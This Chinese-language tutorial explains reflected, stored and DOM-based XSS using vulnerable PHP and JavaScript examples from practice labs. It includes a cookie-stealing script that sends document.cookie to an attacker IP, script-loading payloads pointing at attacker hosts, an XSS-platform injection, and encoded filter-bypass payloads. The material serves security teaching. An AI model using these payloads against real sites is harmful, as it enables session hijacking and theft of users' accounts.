## 0x00 什么是XSS漏洞？
XSS 跨站脚本攻击，它允许Web用户将恶意代码植入到Web网站中，供其他用户访问，当用户访问到有恶意代码的网页时，就会产生 xss 攻击。  

## 0x01 XSS攻击危害
1. 盗取各类用户账号，包括登陆账户、用户网银账户、管理员账号等；
2. 恶意操作企业数据，包括读取、篡改、添加、删除企业敏感数据的能力；
3. 控制受害者机器向其他网站发起攻击；
4. 强制发送电子邮件，网站挂马，非法转账等；  

## 0x02 XSS防御思路
XSS总体的防御思路是：对输入或 URL 参数进行过滤，对输出进行编码。  
（输入过滤，输出编码）  
也就是对提交的所有内容进行过滤，对 url 中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后
对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。  

## 0x03 XSS漏洞类型

总体上XSS分为三类：反射性、存储型、Dom型。  

## 0x04 反射型XSS漏洞
反射型XSS，非持久化，需要欺骗诱导用户自己点击链接才能触发XSS代码。  

反射型XSS攻击方法： 
在反射型 XSS 攻击中，攻击者通常通过发送恶意链接（如邮件或社交媒体上的诱导性链接）引诱目标用户点击。当目标用户点击该链接后，链接中的恶意 XSS 代码会随请求发送到服务器。服务器接收到请求后，会将该 XSS 代码嵌入到响应中返回给用户。此时，用户浏览器解析并执行响应中的恶意脚本，XSS 攻击即会触发。  
代码分析：  
```php
$html='';
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>输入'kobe'试试-_-</p>";
    }else{
        if($_GET['message']=='kobe'){
            $html.="<p class='notice'>愿你和{$_GET['message']}一样，永远年轻，永远热血沸腾！</p><img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/kobe.png' />";
        }else{
            $html.="<p class='notice'>who is {$_GET['message']},i don't care!</p>";
        }
    }
}
<?php echo $html;?>
```
在反射型XSS中，首先判断 $_GET['message'] 是否等于 kobe ，如果不是则在页面中将 $_GET['message'] 直接复制给 $html ，而且没有任何过滤，直接输出到页面中。所以直接输入  
```javascript
<script>alert('xss');</script>
```
页面会直接输出XSS信息，造成XSS攻击。  
payload如下：http://192.168.0.115/06/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(%27xss%27);%
3C/script%3E&submit=submit  

## 0x05 存储型XSS漏洞
存储型XSS，持久化，代码会把数据存储在服务器的数据库中，如个人信息、发表文章或留言板等地方可以插入代码，如果对插入数据没有过滤或过滤不严，那么这些恶意代码就会存到数据库中，用户访问该页面时，没有进行编码过滤就输出到浏览器上，就会触发代码执行，造成XSS攻击。  
代码分析：  
```php
$link=connect();
$html='';
if(array_key_exists("message",$_POST) && $_POST['message']!=null){
    $message=escape($link, $_POST['message']);
    $query="insert into message(content,time) values('$message',now())";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)!=1){
        $html.="<p>数据库出现异常，提交失败！</p>";
    }
}
<?php echo $html;
    $query="select * from message";
    $result=execute($link, $query);
    while($data=mysqli_fetch_assoc($result)){
        echo "<p class='con'>{$data['content']}</p><a href='xss_stored.php?id={$data['id']}'>删除</a>";
    }

    echo $html;
?>

```
在存储型XSS代码中，可以看到 insert into 语句直接插入了留言信息，没有进行任何过滤。  
如果我们输入恶意代码，这个恶意代码也会记录在数据库中。  
浏览器在访问该页面时，恶意代码会从数据库字段里取出这条记录，没有任何过滤直接输出，弹窗提示存在XSS漏洞。  

## 0x06 DOM型XSS
DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞。
DOM，全称 Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和
更新文档的内容、结构以及样式。  
在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object
文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和
事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过
DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行。基于这个特性，就可以利用 JS 脚本
来实现 XSS 漏洞的利用。  
经常出现Dom XSS的关键语句：  
document.referer 属性  
window.name 属性  
location 属性  
innerHTML 属性  
documen.write 属性  

DOM型XSS程序中，只有 html代码，DOM通过操作html或者css实现HTML属性、方法、事件。因此程序没有与服务器进行交互。  

DOM 型 XSS 漏洞代码只涉及到前端 html 或 JS 代码。  
```html
<input id = "button" type="button" value="click me!" onclick="domxss()">
```
这是一个event事件，当我们点击按钮时，会调用domxss（）函数，domxss函数如下：  
```javascript
function domxss(){
    var str = document.getElementById("text").value;
    document.getElementById("dom").innerHTML=<a href='"+str+"'>what do you see?></a>
}

```
获取id=text文本的值，修改id为dom的html值。  
str是我们输入的变量，如果我们输入 ' onclick="alert('dom xss!')"> 第一个引号的作用是闭合前面的单引号，点击按钮即可触发弹窗。  
DOM型的攻击方式是：有一个接口，可以修改 HTML页面代码，比如上面提到的 a 标签，我们输入的 paylaod会嵌入到网页的这个a href标签中，只要用户再次点击这个 a 标签链接，就会触发XSS漏洞。  
## 0x07 XSS 测试语句
在测试网站是否存在 xss 漏洞时，应该输入一些标签如<、>输入后查看网页源代码是否过滤标签，如果没过滤，很大可能存在 xss 漏洞。  
常用的测试语句：  
```txt
<h5>1</h5>
<span>1</span>
<script>console.log(1);</script>
闭合
"><span>x</span><"
'>"><span>x</span><'
单行注释
"><span>x</span>//
```

## 0x08 XSS 攻击语句
XSS 攻击语句，构造方式主要分为以下几种，我们把payload单独放在了 XSSpayload文件中，方便查找。  

## 0x09 XSS 漏洞利用
XSS 漏洞可以通过构造恶意的XSS语句实现很多功能，其中最常用的是，构造恶意代码获取对方浏览器cookie。  
JS代码如下：  
```javascript
var img=document.createElement("img");
img.src="http://192.168.0.127/log?"+escape(document.cookie);
document.body.appendChild(img);
```
第一行代码创建了一个新的图片元素（<img>标签），并将其赋值给变量img；  
第二行代码设置了图片src属性（图片来源URL），document.cookie 会获取当前网页的 cookie 信息，而 escape(document.cookie) 则对这些 cookie 信息进行编码，以便在 URL 中传输。
这行代码通过URL传递了cookie信息到 http://192.168.0.127/log 中，这意味着攻击者将获得该页面的cookie信息。  
第三行代码将图片元素img添加到网页body中。这会触发浏览器尝试加载该图片，最终执行 GET 请求，将cookie信息发送到攻击者指定的服务器。  

把以上内容保存为 xss.js 放在攻击者服务器上，把 src 内容对应修改为攻击者IP。  
然后在受害者网页中存在 XSS 漏洞的地方插入以下payload。
```html
<script src="http://192.168.0.127/xss.js"></script>
```
当网页加载该 payload 时，就会访问 http://192.168.0.127/xss.js 这个脚本，从而触发漏洞利用代码，把受害者的cookie发送给攻击者指定服务器。  

当发现存在 xss 漏洞时，如果只是弹出信息窗口，这样只能证明存在一个xss漏洞，如果想进一步深入的话，
就必须学会如何加载xss攻击payload。同时加载 payload 也要考虑到语句的长度，语句是越短越好，因为有
的插入语句的长度会被限制。  
常见的加载攻击语句有：
```html
<script src="http://192.168.0.121/xss.js"></script>
```
双引号可以去掉，变成：
```html
<script src=http://192.168.0.121/xss.js></script>
```
还可以变成：
```html
<script src=//192.168.0.121/xss.js></script>
```
最下面这种格式，不指定协议，如果网站是 http 会自动加载 http，如果网站是 https会自动变成 https。  

实验验证：  
在 kali 里面打开一个小型 web 服务 ，命令：sudo python -m SimpleHTTPServer 80。  
登陆 dvwa 后，在存储型XSS漏洞靶场位置输入 xss 代码，插入之后，受害者访问该网页就会把它的 cookie 发送到 kali 的 web 服务
上，查看日志就能得到 cookie。  
只要浏览器加载了xss.js这个文件，就会运行这个脚本，就可以把当前登录用户的cookie发送到攻击者指定的服务器。  

## 0x10 加载远程攻击payload
常见payload：  
```html
注意 网站采用的协议。
<script src="http://192.168.0.121/xss.js"></script>
<script src="https://192.168.0.121/xss.js"></script>
自动选择协议
<script src=//192.168.0.121/xss.js></script>
```
图片创建加载链接：
```html
<img src=''
onerror=document.body.appendChild(document.createElement('script')).src='//192.168.0.110/xss.js'>
```
字符并接：  
这种一般是输入的字符有限制的时候使用
```html
<script>z='document.'</script>
<script>z=z+'write("'</script>
<script>z=z+'<script'</script>
<script>z=z+' src=ht'</script>
<script>z=z+'tp://www.'</script>
<script>z=z+'xsstools'</script>
<script>z=z+'.com/a'</script>
<script>z=z+'mER></sc'</script>
<script>z=z+'ript>")'</script>
<script>eval(z)</script>
```
jQuery加载：  
```html
<script>$.getScript("//www.xsstools.com/amER");</script>
```

## 0x11 搭建XSS漏洞利用平台
xss 漏洞利用平台，集合了 xss 攻击的多种方法，很方便快捷的利用 xss 漏洞，生成攻击代码。  
该平台涉及到：设置网站伪静态，然后测试伪静态。  
创建攻击模块，选择 keepsession 如果攻击成功后，cookie 一直会请求刷新，cookie一直请求，不会掉。  
将恶意代码插入存在漏洞的页面，当用户访问有问题的网页时，浏览器会加载恶意的攻击代码，会获取当前受害者访问网站的 cookie 发送到攻击者的服务器里。  
在留言处插入 xss 恶意代码：  
```html
</textarea>'"><script src=http://www.xss123.com/eciAKj?1623635663></script>
```
用户登录后，访问带有恶意代码的网页，盗取 cookie 发送到攻击者服务端。  
攻击者盗取 cookie 后 访问该页面，修改 cookie 即可登录有验证的后台。  

## 0x12 XSS 绕过

一、gpc过滤字符  
如果 gpc 开启的时候，特殊字符会被加上斜杠即，'变成\' xss 攻击代码不要带用单引号或双引号。  
绕过gpc：在 php 高版本 gpc 默认是没有的，但是开发程序员会使用 addcslashes()对特殊字符进行转义。  
\<script src='http://www.xss123.com/JGdbsl?1623638390'></script>这个是执行不了的
\<script src=http://www.xss123.com/JGdbsl?1623638390></script> 没有单引号可执行。

二、过滤alert
当页面过滤 alert 这个函数时，因为这个函数会弹窗，不仅很多程序会对他进行过滤，而且很多 waf 都会对其进行拦截。所以payload中不存在 alert 即可。
```html
<script>prompt(/xss/);</script>
<script>confirm(1);</script>
<script src=http://www.xss123.com/eciAKj?1623635663></script>
```

三、过滤标签  
在程序里如果使用html实体过滤，php代码编写时就会使用htmlspecialchars()对输入字符进行实体化。
实体化之后的字符不会在 html 执行。把预定义的字符 "<" （小于）和 ">" （大于）转换为 HTML 实体，构造 xss 恶意代码大多数都必须使用<或者>，这两个字符被实体化后在 html 里就不能执行了。  
```txt
预定义的字符是：
& (和号)成为 &amp
" (双引号)成为 &quot ’ (单引号)成为&#039
< (小于)成为 &lt
>(大于)成为 &gt
```

四、ASCII编码  
```html
<script>alert(String.fromCharCode(88,83,83))</script>
```

五、URL编码  
```html
<a href="javascript:%61%6c%65%72%74%28%32%29">123</a>
```

六、JS编码  
https://www.jb51.net/tools/zhuanhuan.htm

七、8进制编码  
```html
<script>eval("\141\154\145\162\164\50\61\51");</script>
```
八、16进制编码  
```html
<script>eval("\x61\x6c\x65\x72\x74\x28\x31\x29")</script>
```
九、JSunicode编码  

```html
<script>\u0061\u006c\u0065\u0072\u0074('xss');</script>
```
十、HTML编码  

```html
十进制
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;" />
<button onclick="confirm('7&#39;);">Button</button>

十六进制
<img src="x" onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
```
十一、base64编码  
使用伪协议 base64 解码执行 xss。

```html
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">111</a>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

## 0x13 XSS实战
上面我们已经得知了 XSS 的基本原理与知识，在渗透测试中，XSS是广泛存在的，发现和挖掘这种漏洞相对比较容易，网站管理员也不会过多关注这种漏洞。  

一、反射型XSS漏洞挖掘  
1. 寻找用户能够输入，在客户端可控的输入点；
2. 输入恶意参数后，能够原型输出，没有过滤掉恶意代码；  

二、存储型XSS漏洞挖掘  
1. 寻找一切能够输入的地方，包括留言板、发表文章、友链等；
2. 找能和数据库交互的地方，都有可能存在存储型xss漏洞，除了检测输入，还要检测输出是否有过滤；    

三、DOM型XSS漏洞挖掘  
1. DOM型xss是由于改变html的属性或动作造成的；
2. 查找能操作html属性的函数，特别是document.getElementById、document.getElementsByName、document.getElementsByTagName、getelementbyid.innerHTML等；  
3. document.write();  

```txt
getElementById() 返回对拥有指定 id 的第一个对象的引用。
getElementsByName() 返回带有指定名称的对象集合。
getElementsByTagName() 返回带有指定标签名的对象集合。
getelementbyid.innerHTML 更改 html 的字符串。
document.write() 用于向 HTML 文档输出内容。
```




